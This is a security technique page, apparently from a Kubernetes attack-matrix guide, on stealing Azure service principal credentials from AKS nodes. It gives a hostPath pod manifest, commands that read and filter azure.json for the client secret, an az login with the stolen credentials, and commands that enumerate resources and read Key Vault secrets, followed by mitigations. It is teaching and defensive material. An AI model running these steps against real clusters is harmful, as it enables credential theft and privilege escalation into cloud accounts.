# Mount Service Principal

Attackers who gain access to a pod on an AKS node can mount and read the Azure service principal credentials stored on the node, then use those credentials to escalate privileges into the Azure control plane.

> **Note:** This technique requires a cloud-managed Kubernetes cluster and cannot be fully demonstrated on a local Kind cluster.

## Description

AKS has an option to authenticate with Azure using a service principal. When this option is enabled, each node stores service principal credentials that are located in `/etc/kubernetes/azure.json`. AKS uses this service principal to create and manage Azure resources that are needed for the cluster operation. By default, the service principal has Contributor permissions in the cluster's Resource Group. Attackers who get access to this service principal file — by `hostPath` mount, for example — can use its credentials to access or modify the cloud resources.

The attack chain is:

1. Attacker compromises a pod (via RCE, supply chain attack, etc.)
2. Pod spec includes a `hostPath` volume mounting `/etc/kubernetes/` from the node
3. Attacker reads `azure.json` to extract the `clientId` and `clientSecret`
4. Attacker authenticates to Azure with the service principal credentials
5. Attacker uses the Contributor role to enumerate, exfiltrate, or pivot to other Azure resources

## Prerequisites

- An Azure Kubernetes Service (AKS) cluster configured with service principal authentication (not Managed Identity).
- `kubectl` configured to connect to the AKS cluster.
- `az` CLI installed on your workstation.

## Conceptual Walkthrough

### Step 1 - Deploy a pod with a hostPath mount to the node filesystem

The following manifest mounts the node's `/etc/kubernetes/` directory into the pod. Any user or process inside the container can then read the service principal credential file.

```yaml
# hostpath-mount.yaml (conceptual - do not apply to production clusters)
apiVersion: v1
kind: Pod
metadata:
  name: node-mounter
  namespace: default
spec:
  containers:
    - name: attacker
      image: alpine:3.19
      command: ["sleep", "3600"]
      volumeMounts:
        - name: node-config
          mountPath: /host/etc/kubernetes
          readOnly: true
  volumes:
    - name: node-config
      hostPath:
        path: /etc/kubernetes
        type: Directory
  # Required to schedule on a control-plane or worker node
  tolerations:
    - operator: Exists
```

### Step 2 - Read the service principal credentials

Once inside the pod, read the Azure credential file:

```bash
kubectl exec -it pod/node-mounter -- /bin/sh
```

```bash
cat /host/etc/kubernetes/azure.json
```

Expected output (abbreviated):

```json
{
  "cloud": "AzurePublicCloud",
  "tenantId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "subscriptionId": "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy",
  "aadClientId": "zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz",
  "aadClientSecret": "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890!@#",
  "resourceGroup": "MC_myResourceGroup_myCluster_eastus",
  "location": "eastus",
  "vmType": "standard",
  ...
}
```

Extract the key fields:

```bash
cat /host/etc/kubernetes/azure.json | grep -E '"tenantId"|"aadClientId"|"aadClientSecret"|"subscriptionId"'
```

### Step 3 - Authenticate to Azure with the stolen credentials

From any machine with the `az` CLI installed, use the extracted credentials to authenticate:

```bash
az login --service-principal \
  --tenant <tenantId> \
  --username <aadClientId> \
  --password <aadClientSecret>
```

### Step 4 - Enumerate Azure resources accessible to the service principal

List resource groups the service principal can access:

```bash
az group list --output table
```

List all resources in the cluster's managed resource group:

```bash
az resource list \
  --resource-group MC_myResourceGroup_myCluster_eastus \
  --output table
```

Because the service principal has Contributor permissions on the managed resource group, an attacker can:

- Read or download secrets from Azure Key Vault (if linked)
- Access Azure Storage accounts containing cluster data
- Modify or delete node VM scale sets, disrupting the cluster
- Read container registry credentials to pull or tamper with images
- Create new resources (VMs, NICs) within the resource group for persistence

### Step 5 - Retrieve secrets from Azure Key Vault (if accessible)

```bash
# List Key Vaults in the subscription
az keyvault list --output table

# List secrets in a Key Vault
az keyvault secret list --vault-name <vault-name> --output table

# Read a specific secret value
az keyvault secret show --vault-name <vault-name> --name <secret-name>
```

## Mitigation

- Use **Managed Identity** instead of service principals for AKS clusters. Managed identities eliminate the need to store credentials on node filesystems.
- Apply **Pod Security Admission** (`restricted` policy) or OPA/Gatekeeper policies that deny `hostPath` volumes.
- Grant the service principal or Managed Identity **least privilege** — avoid Contributor at the subscription or resource group level.
- Enable **Azure Defender for Kubernetes** to detect suspicious API calls and credential use patterns.

## Resources

- [AKS Service Principals](https://learn.microsoft.com/en-us/azure/aks/kubernetes-service-principal)
- [AKS Managed Identity](https://learn.microsoft.com/en-us/azure/aks/use-managed-identity)
- [Extracting Credentials from Azure Kubernetes Service](https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/)
- [MITRE ATT&CK - Unsecured Credentials: Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/)
- [Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
